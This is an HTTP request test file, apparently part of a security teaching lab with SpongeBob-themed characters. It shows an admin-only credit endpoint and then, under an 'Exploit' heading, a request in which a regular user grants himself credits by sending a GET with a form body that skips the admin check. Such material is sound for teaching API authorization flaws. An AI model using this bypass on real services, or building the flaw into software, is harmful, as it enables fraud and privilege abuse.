# @import ../common/setup.http
@host = {{base_host}}/v202

# As platform becomes more popular, Sandy can't keep adding credits manually
# and adds a new endpoint to automate the process.

### Sandy adds credits to Spongebob's account
POST /account/credits
X-Admin-API-Key: {{platform_api_key}}
Content-Type: application/x-www-form-urlencoded

user=spongebob@krusty-krab.sea&amount=100

?? status == 200
?? js response.parsedBody.balance > 100


# --- Exploit: Plankton can add credits to his own account ---

### Plankton checks his current balance
# @no-cookie-jar
# @name initial_balance
GET /account/credits
Authorization: {{plankton_auth}}

?? js response.parsedBody.email == plankton@chum-bucket.sea


### Plankton manages to top up his own balance, by sending a weird request
# (GET request with an urlencoded form body)
# @no-cookie-jar
GET /account/credits
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=100&user=plankton@chum-bucket.sea

?? status == 200
?? js parseFloat(response.parsedBody.balance) == {{parseFloat(initial_balance.balance) + 100}}
